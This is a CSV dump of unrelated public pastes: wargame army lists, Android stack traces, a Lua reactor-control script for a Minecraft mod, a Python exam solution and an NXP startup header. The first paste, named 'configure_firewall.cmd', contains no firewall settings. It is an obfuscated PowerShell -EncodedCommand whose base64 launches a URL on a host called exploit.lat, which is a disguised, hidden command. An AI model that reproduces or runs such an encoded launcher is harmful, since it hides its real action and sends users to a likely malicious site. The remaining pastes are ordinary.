id,title,username,language,date,content
rSa5tdfc,configure_firewall.cmd,austinaceeeeee,Batch,Sunday 8th of June 2025 01:00:25 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYQBjAGMAYwA2ADkAZQBjAA==

HEkgvv"
3civ0FaT,Ottawa Teams R5 Knights,TableTopLive,PHP,Sunday 8th of June 2025 12:51:54 PM CDT,"Player Name: Antoine Boivin
Factions Used: Imperial Knights / Imperial Agents
Army Points: 2000
Army Enhancements: none
Detachment Rule: noble lance ( indomitable heroes)
++++++++++++++++++++++++++++++++++

Finally, a Knight list that is different (2000 points)

Imperial Knights
Strike Force (2000 points)
Noble Lance


CHARACTERS

Canis Rex (450 points)
• Warlord
• 1x Chainbreaker las-impulsor
1x Chainbreaker multi-laser
1x Freedom’s Hand


BATTLELINE

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Helverin (130 points)
• 2x Armiger autocannon
1x Armoured feet
1x Questoris heavy stubber

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear

Armiger Warglaive (140 points)
• 1x Meltagun
1x Reaper chain-cleaver
1x Thermal spear


ALLIED UNITS

Callidus Assassin (100 points)
• 1x Neural shredder
1x Phase sword and poison blades

Sisters of Battle Immolator (115 points)
• 1x Armoured tracks
1x Heavy bolter
1x Hunter-killer missile
1x Immolation flamers

Sisters of Battle Squad (115 points)
• 1x Sister Superior
• 1x Bolt pistol
1x Close combat weapon
1x Condemnor boltgun
1x Power weapon
• 9x Battle Sister
• 9x Bolt pistol
7x Boltgun
9x Close combat weapon
1x Meltagun
1x Multi-melta
1x Simulacrum Imperialis"
tddByu9d,Ottawa Teams R5 Necrons,TableTopLive,PHP,Sunday 8th of June 2025 12:51:37 PM CDT,"Player Name: Devin Swann
Team Name: Blunt Force Trauma
Factions Used: Necrons
Army Points: 1995
Army Enhancements (list on which models): Dread Majesty (on Char1: Catacomb Command Barge) & Demanding Leader (on Char2: Technomancer)
Detachment Rule: Relentless Onslaught
+++++++++++++++++++++++++++++++++++++++++++++++

Char1: 1x Imotekh the Stormlord (100 pts): Gauntlet of Fire, Staff of the Destroyer
Char2: 1x Catacomb Command Barge (150 pts): Resurrection orb, Warlord, Gauss cannon, Overlord's blade
Enhancement: Dread Majesty (+30 pts)
Char3: 1x Technomancer (95 pts): Staff of light
Enhancement: Demanding Leader (+10 pts)
Char4: 1x Technomancer (85 pts): Staff of light
Char5: 1x Technomancer (85 pts): Staff of light

3x Ophydian Destroyers (80 pts): Plasmacyte, 3 with Ophydian hyperphase weapons
1x Lokhust Destroyers (35 pts): Close combat weapon, Gauss cannon
6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
1x Canoptek Reanimator (75 pts): 2x Atomiser beam, Reanimator's claws
1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array
1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array
1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array"
JpPT0hib,2025-06-08T19:37:55.502859,powerampache,PHP,Sunday 8th of June 2025 12:38:03 PM CDT,"1.00-70 (70) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getSongs() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
9kF0Qxt0,2025-06-08T19:37:53.530252,powerampache,PHP,Sunday 8th of June 2025 12:38:03 PM CDT,"1.00-70 (70) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
DRSUCzZf,2025-06-08T19:37:55.486850,powerampache,PHP,Sunday 8th of June 2025 12:38:01 PM CDT,"1.00-70 (70) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

getArtists() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
GXqUC2nR,reactor,lemarwin,Lua,Sunday 8th of June 2025 12:06:12 PM CDT,"if warpdriveCommons then os.unloadAPI(""warpdriveCommons"") end
if not os.loadAPI(""warpdrive/warpdriveCommons"") then error(""missing warpdriveCommons"") end
local w = warpdriveCommons.w
local min_stability = 5.0

local data

----------- Reactor support

--  0000000001111111111222222222233333333334444444444
--  1234567890123456789012345678901234567890123456789
-- [Reactor stability %      Laser level k           ]
-- [ 99.9 99.9 99.9 99.9     56 123456 123456 123456 ]
-- [ 99.9 99.9 99.9 99.9     123.4 123.4 123.4 123.4 ]
-- [ 99.9 99.9 99.9 99.9     4.5 x 456 123456 123456 ]
-- [ 99.9 99.9 99.9 99.9 123456 123456 123456 123456 ]

local reactor
local reactorlasers = {}

local reactor_outputMode = ""off""
local reactor_outputThreshold = 100
local reactor_targetStability = 50
local reactor_laserAmount = 10000

local reactor_output = 0

function reactor_read(parData)
  data = parData
end

function reactor_boot()
  if reactor ~= nil then
    w.writeLn(""Booting Reactor..."")
    reactor_outputMode, reactor_outputThreshold = reactor.outputMode()
    reactor_targetStability = 100.0 - reactor.instabilityTarget()
    reactor_laserAmount = reactor.stabilizerEnergy()
  end
end

function reactor_cycleOutputMode()
  if reactor_outputMode == ""off"" then
    reactor_outputMode = ""above""
  elseif reactor_outputMode == ""above"" then
    reactor_outputMode = ""at_rate""
  else
    reactor_outputMode = ""off""
  end
end

local stage = ""off""
local preoutput_cycles = 0

function run_stage()
    if stage == ""off"" then
        reactor_stop()
    elseif stage == ""warmup"" then
        reactor_outputMode = ""off""
        reactor_start()
    elseif stage == ""preoutput"" then
        preoutput_cycles = 0
        reactor_outputThreshold = 75000
        reactor_outputMode = ""above""
        reactor_setMode()
    elseif stage == ""output"" then
        reactor_outputThreshold = 7500
        reactor_outputMode = ""above""
        reactor_setMode()
    end
end

function reactor_key(character, keycode)
  if character == 's' or character == 'S' then -- S
    reactor_start()
    return true
  elseif character == 'p' or character == 'P' then -- P
    reactor_stop()
    return true
  elseif character == 'l' or character == 'L' then -- L
    reactor_laser()
    return true
  elseif character == 'o' or character == 'O' then -- O
    reactor_cycleOutputMode()
    reactor_setMode()
    return true
  elseif character == 'g' or character == 'G' then -- G
    reactor_outputThreshold = reactor_outputThreshold - 1000
    reactor_setMode()
    return true
  elseif character == 't' or character == 'T' then -- T
    reactor_outputThreshold = reactor_outputThreshold + 1000
    reactor_setMode()
    return true
  elseif character == 'j' or character == 'J' then -- J
    reactor_laserAmount = reactor_laserAmount - 500
    reactor_setLaser()
    return true
  elseif character == 'u' or character == 'U' then -- U
    reactor_laserAmount = reactor_laserAmount + 500
    reactor_setLaser()
    return true
  elseif character == '-' then -- -
    reactor_targetStability = reactor_targetStability - 1
    reactor_setTargetStability()
    return true
  elseif character == '+' then -- +
    reactor_targetStability = reactor_targetStability + 1
    reactor_setTargetStability()
    return true
  elseif character == 'c' or character == 'C' then -- C
    reactor_config()
    return true
  elseif character == 'a' or character == 'C' then 
    if stage == ""off"" then
        stage = ""warmup""
        run_stage()
        return true
    else 
        stage = ""off""
        run_stage()
        return true
    end
  end
  return false
end

function reactor_page()
  w.page_begin(w.data_getName() .. "" - Reactor status"")
  
  w.setCursorPos(1, 2)
  if reactor == nil or reactor.isInterfaced() == nil then
    w.setColorDisabled()
    w.write(""Reactor not detected"")
  else
    w.setColorNormal()
    w.write(""Reactor stability (%)"")
    local instabilities = { reactor.getInstabilities() }
    for key, instability in pairs(instabilities) do
      local y = (key - 1) % 4
      local x = (key - 1 - y) / 4
      w.setCursorPos(2 + 6 * x, 3 + y)
      local stability = math.floor((100.0 - instability) * 10) / 10.0
      if stability >= reactor_targetStability then
        w.setColorSuccess()
      else
        w.setColorWarning()
      end
      w.write(w.format_float(stability, 5))
    end
    
    w.setColorNormal()
    local energyStored, energyMax, energyUnits, _, energyOutputRate = reactor.getEnergyStatus()
    w.setCursorPos(1, 7)
    w.write(""Energy   : "")
    w.write(w.format_integer(energyStored, 10) .. "" / "" .. w.format_integer(energyMax, 10) .. "" "" .. energyUnits .. "" +"" .. w.format_integer(reactor_output, 6) .. "" "" .. energyUnits .. ""/t"")
    w.setCursorPos(1, 8)
    w.write(""Outputing: "")
    w.write(w.format_integer(energyOutputRate, 6) .. "" "" .. energyUnits .. ""/t"")
    
    w.setCursorPos(1, 9)
    w.setColorNormal()
    w.write(""Activated: "")
    local isEnabled = reactor.enable()
    if isEnabled then w.setColorSuccess() else w.setColorNormal() end
    w.write(w.format_boolean(isEnabled, ""YES"", ""no""))
    w.setCursorPos(1,10)
    w.setColorNormal()
    w.write(""Auto stage: "")
    w.write(stage)
  end
  
  w.setCursorPos(28, 2)
  if #reactorlasers == 0 then
    w.setColorDisabled()
    w.write(""Lasers not detected"")
  else
    w.setColorNormal()
    w.write(""Lasers charge (k)"")
    
    for _, reactorlaser in pairs(reactorlasers) do
      if reactorlaser.wrap ~= nil and reactorlaser.side ~= nil then
        local y = reactorlaser.side % 4
        local x = (reactorlaser.side - y) / 4
        w.setCursorPos(28 + 6 * x, 3 + y)
        local energyStored, _, _ = reactorlaser.wrap.getEnergyStatus()
        if energyStored == nil then
          energyStored = -1
        end
        local energy_k = math.floor(energyStored / 100) / 10.0
        if not reactorlaser.wrap.getAssemblyStatus() then
          w.setColorDisabled()
        elseif energyStored > 3 * reactor_laserAmount then
          w.setColorSuccess()
        else
          w.setColorWarning()
        end
        w.write(w.format_integer(energy_k, 5))
      end
    end
  end
  
  w.setCursorPos(1, 10)
  w.setColorNormal()
  w.write(""  -----------------------------------------------"")
  w.setCursorPos(1, 11)
  w.write(""Output mode     : "")
  if reactor_outputMode == ""off"" then
    w.setColorDisabled()
    w.write(""hold"")
  elseif reactor_outputMode == ""unlimited"" then
    w.write(""manual/unlimited"")
  elseif reactor_outputMode == ""above"" then
    w.write(""surplus above "" .. reactor_outputThreshold .. "" RF"")
  else
    w.write(""rated at "" .. reactor_outputThreshold .. "" RF"")
  end
  w.setCursorPos( 1, 12)
  w.setColorNormal()
  w.write(""Target stability: "" .. reactor_targetStability .. ""%"")
  w.setCursorPos(30, 12)
  w.write(""Laser amount: "" .. w.format_integer(reactor_laserAmount))
  
  w.setCursorPos(1, 14)
  w.setColorControl()
  w.writeFullLine("" Start/stoP reactor (S/P), Use lasers (L)"")
  w.writeFullLine("" Output mode (O), Configuration (C)"")
  w.writeFullLine("" Target stability (+/-), Laser amount (U/J)"")
  w.writeFullLine("" Output rate/threshold (T/G)"")
end

function reactor_setMode()
  if reactor_outputThreshold < 1 then
    reactor_outputThreshold = 1
  elseif reactor_outputThreshold > 100000 then
    reactor_outputThreshold = 100000
  end
  if reactor ~= nil then
      reactor.outputMode(reactor_outputMode, reactor_outputThreshold)
  end
end

function reactor_setLaser()
  if reactor_laserAmount < 1 then
    reactor_laserAmount = 1
  elseif reactor_laserAmount > 100000 then
    reactor_laserAmount = 100000
  end
  if reactor ~= nil then
    reactor_laserAmount = reactor.stabilizerEnergy(reactor_laserAmount)
  end
end

function reactor_setTargetStability()
  if reactor_targetStability < 1.0 then
    reactor_targetStability = 1.0
  elseif reactor_targetStability > 100.0 then
    reactor_targetStability = 100.0
  end
  if reactor ~= nil then
    reactor_targetStability = 100.0 - reactor.instabilityTarget(100.0 - reactor_targetStability)
  end
end

function reactor_start()
  if reactor ~= nil then
    reactor_setMode()
    reactor.enable(true)
  end
end

function reactor_stop()
  if reactor ~= nil then
    reactor.enable(false)
  end
end

function reactor_laser(side)
  for key, reactorlaser in pairs(reactorlasers) do
    if (side == nil) or (reactorlaser.side == side) then
      reactorlaser.wrap.stabilize(reactor_laserAmount)
    end
  end
end

local reactor_configPageLoaded = false
function reactor_pulse(output)
  reactor_output = output
  if reactor == nil or reactor.isInterfaced() == nil then
    w.reboot()
  end
  local instabilities = { reactor.getInstabilities() }
  for key, instability in pairs(instabilities) do
    local stability = math.floor((100.0 - instability) * 10) / 10
    if stability <= min_stability then 
        redstone.setOutput(""right"", true)
    end
  end
  local energyStored, energyMax, energyUnits, _, energyOutputRate = reactor.getEnergyStatus()
  if stage == ""warmup"" and (energyStored == energyMax) then 
    stage = ""preoutput""
    run_stage()
  elseif stage == ""preoutput"" then 
    if preoutput_cycles == 10 then 
        stage = ""output""
        run_stage()
    else 
        preoutput_cycles = preoutput_cycles + 1
    end
  end
  if w.page_getCallbackDisplay() == reactor_page and (not reactor_configPageLoaded) then
    for key, instability in pairs(instabilities) do
      local y = (key - 1) % 4
      local x = (key - 1 - y) / 4
      w.setCursorPos(2 + 6 * x, 3 + y)
      local stability = math.floor((100.0 - instability) * 10) / 10
      if stability >= reactor_targetStability then
        w.setColorSuccess()
      else
        w.setColorWarning()
      end
      w.write(w.format_float(stability, 5))
    end
    w.setCursorPos(12, 7)
    w.setColorNormal()
    w.write(w.format_integer(energyStored, 10))
    w.setCursorPos(40, 7)
    w.write(w.format_integer(reactor_output, 6))
    w.setCursorPos(12, 8)
    w.write(w.format_integer(energyOutputRate, 6))
    
    if #reactorlasers ~= 0 then
      for _, reactorlaser in pairs(reactorlasers) do
        if reactorlaser.wrap ~= nil and reactorlaser.side ~= nil then
          local y = reactorlaser.side % 4
          local x = (reactorlaser.side - y) / 4
          w.setCursorPos(28 + 6 * x, 3 + y)
          local energyStored, _, _ = reactorlaser.wrap.getEnergyStatus()
          if energyStored == nil then
            energyStored = -1
          end
          local energy_k = math.floor(energyStored / 100) / 10.0
          if not reactorlaser.wrap.getAssemblyStatus() then
            w.setColorDisabled()
          elseif energyStored > 3 * reactor_laserAmount then
            w.setColorSuccess()
          else
            w.setColorWarning()
          end
          w.write(w.format_integer(energy_k, 5))
        end
      end
    end
  end
end

function reactor_config()
  reactor_configPageLoaded = true
  w.page_begin(w.data_getName() .. "" - Reactor configuration"")
  
  w.setCursorPos(1, 2)
  if reactor == nil or reactor.isInterfaced() == nil then
    w.setColorDisabled()
    w.write(""Reactor not detected"")
  else
    -- reactor output rate
    w.setCursorPos(1, 6)
    w.setColorHelp()
    w.writeFullLine("" Enter a positive number."")
    
    w.setCursorPos(1, 4)
    w.setColorNormal()
    w.write(""Reactor output rate ("" .. w.format_integer(reactor_outputThreshold) .. "" RF): "")
    reactor_outputThreshold = w.input_readInteger(reactor_outputThreshold)
    reactor_setMode()
    w.setCursorPos(1, 5)
    w.write(""Reactor output rate set"")
    w.setCursorPos(1, 6)
    w.writeFullLine("" "")
    
    -- laser amount
    w.setCursorPos(1, 9)
    w.setColorHelp()
    w.writeFullLine("" Enter a positive number."")
    
    w.setCursorPos(1, 7)
    w.setColorNormal()
    w.write(""Laser energy level ("" .. w.format_integer(reactor_laserAmount) .. ""): "")
    reactor_laserAmount = w.input_readInteger(reactor_laserAmount)
    reactor_setLaser()
    w.setCursorPos(1, 8)
    w.write(""Laser energy level set"")
    w.setCursorPos(1, 9)
    w.writeFullLine("" "")
    
    -- target stability
    w.setCursorPos(1, 12)
    w.setColorHelp()
    w.writeFullLine("" Enter a positive number."")
    
    w.setCursorPos(1, 10)
    w.setColorNormal()
    w.write(""Reactor target stability ("" .. w.format_integer(reactor_targetStability) .. ""%): "")
    reactor_targetStability = w.input_readInteger(reactor_targetStability)
    reactor_setTargetStability()
    w.setCursorPos(1, 11)
    w.write(""Reactor target stability set"")
    w.setCursorPos(1, 12)
    w.writeFullLine("" "")
  end
  reactor_configPageLoaded = false
end

function reactor_register()
  w.device_register(""warpdriveEnanReactorCore"",
      function(deviceType, address, wrap) reactor = wrap end,
      function() end)
  w.device_register(""warpdriveEnanReactorLaser"",
      function(deviceType, address, wrap) table.insert(reactorlasers, { side = wrap.side(), wrap = wrap }) end,
      function() end)
  w.event_register(""reactorPulse""       , function(eventName, param) reactor_pulse(param)                        return false end )
  w.event_register(""reactorDeactivation"", function(                ) w.status_showWarning(""Reactor deactivated"") return false end )
  w.event_register(""reactorActivation""  , function(                ) w.status_showWarning(""Reactor activated"")   return false end )
  w.data_register(""reactor"", reactor_read, nil, nil)
end

----------- connections status

function connections_page(isBooting)
  w.page_begin(w.data_getName() .. "" - Connections"")
  
  w.writeLn("""")
  
  local monitors = w.device_getMonitors()
  if #monitors == 0 then
    w.setColorDisabled()
    w.writeLn(""No Monitor detected"")
  elseif #monitors == 1 then
    w.setColorSuccess()
    w.writeLn(""1 monitor detected"")
  else
    w.setColorSuccess()
    w.writeLn(#monitors .. "" Monitors detected"")
  end
  
  if reactor == nil or reactor.isInterfaced() == nil then
    w.setColorDisabled()
    w.writeLn(""No Enantiomorphic reactor detected"")
  else
    w.setColorSuccess()
    w.writeLn(""Enantiomorphic reactor detected"")
    if isBooting then
      reactor_boot()
    end
  end
  
  if #reactorlasers == 0 then
    w.setColorDisabled()
    w.writeLn(""No reactor stabilisation laser detected"")
  elseif #reactorlasers == 1 then
    w.setColorSuccess()
    w.writeLn(""1 reactor stabilisation laser detected"")
  else
    w.setColorSuccess()
    w.writeLn(#reactorlasers .. "" reactor stabilisation lasers detected"")
  end
  
  w.writeLn("""")
  w.setColorNormal()
  w.writeLn(""This is a keyboard controlled user interface."")
  w.write(""Key controls are written like so: "")
  w.setColorControl()
  w.write(""Action (key)"")
  w.setColorNormal()
  w.writeLn(""."")
  w.write(""For example, typing "")
  w.setColorControl()
  w.write("" 1 "")
  w.setColorNormal()
  w.writeLn("" will open Reactor controls."")
end

----------- Boot sequence

w.page_setEndText("" Home (0), Reactor controls (1)"")
w.page_register('0', connections_page, nil)
w.page_register('1', reactor_page, reactor_key)
reactor_register()

w.boot()
local success, message = pcall(w.run)
if not success then
  print(""failed with message"")
  print(message)
  w.sleep(3.0)
  print(""rebooting..."")
  w.reboot()
else
  w.close()
end
"
d8raPyFG,Key For All Games,lunox039,Lua,Sunday 8th of June 2025 12:04:25 PM CDT,subscribeMenyanety
1821prLQ,24,nq1s788,Python,Sunday 8th of June 2025 12:00:55 PM CDT,"#24 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&select=7FFFFFF&answers=on&varId=91034
s = open('24.txt').readline()
alph = '1234567890ABCDEF'
c = ''
answ = 0
for e in s:
    if e not in alph:
        if len(c) != 0:
            if '0' in c:
                lst0 = c.rindex('0')
                c = c[:lst0 + 1]
                while len(c) > 0 and c[0] == '0':
                    c = c[1:]
                answ = max(answ, len(c))
            c = ''
    else:
        c += e
print(answ)"
HRYJx2tV,startup.h,Mike057,C,Sunday 8th of June 2025 11:29:27 AM CDT,"/*
 * Copyright 2013 - 2014, Freescale Semiconductor, Inc.
 * Copyright 2016-2021, 2023 NXP
 *                                                                                                                                                                                                                                                     
 * SPDX-License-Identifier: BSD-3-Clause
 */

#ifndef STARTUP_H
#define STARTUP_H

#include <stdint.h>
#include ""device_registers.h""
/**
 * @page misra_violations MISRA-C:2012 violations
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 2.5, Local macro not referenced.
 * The defined macro is used as include guard.
 *
 * @section [global]
 * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
 * scope if its identifier only appears in a single function.
 * All variables with this problem are defined in the linker files.
 *
 */

/*******************************************************************************
 * API
 ******************************************************************************/

/*!
 * @brief define symbols that specific start and end addres of some basic sections.
 */
#if (defined(S32K14x_SERIES) || defined(S32K11x_SERIES) || defined(S32V234_SERIES) || \
     defined(MPC574x_SERIES) || defined(S32R_SERIES) || defined(S32MTV_SERIES) || \
     defined(SJA1110_SERIES)) || defined (S32K144W_M4_SERIES) || defined (S32K142W_M4_SERIES)
    #if (defined(__ICCARM__))
        #define INTERRUPTS_SECTION_START               __section_begin("".intvec"")
        #define INTERRUPTS_SECTION_END                 __section_end("".intvec"")
        #define BSS_SECTION_START                      __section_begin("".bss"")
        #define BSS_SECTION_END                        __section_end("".bss"")
        #define DATA_SECTION_START                     __section_begin("".data"")
        #define DATA_SECTION_END                       __section_end("".data"")
        #define CUSTOMSECTION_SECTION_START            __section_begin("".customSection"")
        #define CUSTOMSECTION_SECTION_END              __section_end("".customSection"")
        #define CODE_RAM_SECTION_START                 __section_begin(""__CODE_RAM"")
        #define CODE_RAM_SECTION_END                   __section_end(""__CODE_RAM"")
        #define DATA_INIT_SECTION_START                __section_begin("".data_init"")
        #define DATA_INIT_SECTION_END                  __section_end("".data_init"")
        #define CODE_ROM_SECTION_START                 __section_begin(""__CODE_ROM"")
        #define CODE_ROM_SECTION_END                   __section_end(""__CODE_ROM"")

    #elif (defined(__ARMCC_VERSION))
        #define INTERRUPTS_SECTION_START               (uint8_t *)__VECTOR_ROM_START
        #define INTERRUPTS_SECTION_END                 (uint8_t *)__VECTOR_ROM_END
        #define BSS_SECTION_START                      (uint8_t *)__BSS_START
        #define BSS_SECTION_END                        (uint8_t *)__BSS_END
        #define DATA_SECTION_START                     (uint8_t *)__DATA_RAM_START
        #define DATA_SECTION_END                       (uint8_t *)__DATA_RAM_END
        #define CUSTOMSECTION_SECTION_START            (uint8_t *)__CUSTOM_SECTION_START
        #define CUSTOMSECTION_SECTION_END              (uint8_t *)__CUSTOM_SECTION_END
        #define CODE_RAM_SECTION_START                 (uint8_t *)__CODE_RAM_START
        #define CODE_RAM_SECTION_END                   (uint8_t *)__CODE_RAM_END

        extern uint32_t __VECTOR_ROM_START;
        extern uint32_t __VECTOR_ROM_END;
        extern uint32_t __BSS_START;
        extern uint32_t __BSS_END;
        extern uint32_t __DATA_RAM_START;
        extern uint32_t __DATA_RAM_END;
        extern uint32_t __CUSTOM_SECTION_START;
        extern uint32_t __CUSTOM_SECTION_END;
        extern uint32_t __CODE_RAM_START;
        extern uint32_t __CODE_RAM_END;
    #else
        #define INTERRUPTS_SECTION_START               (uint8_t *)&__interrupts_start__
        #define INTERRUPTS_SECTION_END                 (uint8_t *)&__interrupts_end__
        #define BSS_SECTION_START                      (uint8_t *)&__bss_start__
        #define BSS_SECTION_END                        (uint8_t *)&__bss_end__
        #define DATA_SECTION_START                     (uint8_t *)&__data_start__
        #define DATA_SECTION_END                       (uint8_t *)&__data_end__
        #define CUSTOMSECTION_SECTION_START            (uint8_t *)&__customSection_start__
        #define CUSTOMSECTION_SECTION_END              (uint8_t *)&__customSection_end__
        #define CODE_RAM_SECTION_START                 (uint8_t *)&__code_ram_start__
        #define CODE_RAM_SECTION_END                   (uint8_t *)&__code_ram_end__

        extern uint32_t __interrupts_start__;
        extern uint32_t __interrupts_end__;
        extern uint32_t __bss_start__;
        extern uint32_t __bss_end__;
        extern uint32_t __data_start__;
        extern uint32_t __data_end__;
        extern uint32_t __customSection_start__;
        extern uint32_t __customSection_end__;
        extern uint32_t __code_ram_start__;
        extern uint32_t __code_ram_end__;
    #endif
#endif

#if (defined(__ICCARM__))
    #pragma section = "".data""
    #pragma section = "".data_init""
    #pragma section = "".bss""
    #pragma section = "".intvec""
    #pragma section = "".customSection""
    #pragma section = "".customSection_init""
    #pragma section = ""__CODE_RAM""
    #pragma section = ""__CODE_ROM""
#endif

/*!
 * @brief Make necessary initializations for RAM.
 *
 * - Copy initialized data from ROM to RAM.
 * - Clear the zero-initialized data section.
 * - Copy the vector table from ROM to RAM. This could be an option.
 */
void init_data_bss(void);

#endif /* STARTUP_H*/
/*******************************************************************************
 * EOF
 ******************************************************************************/

"
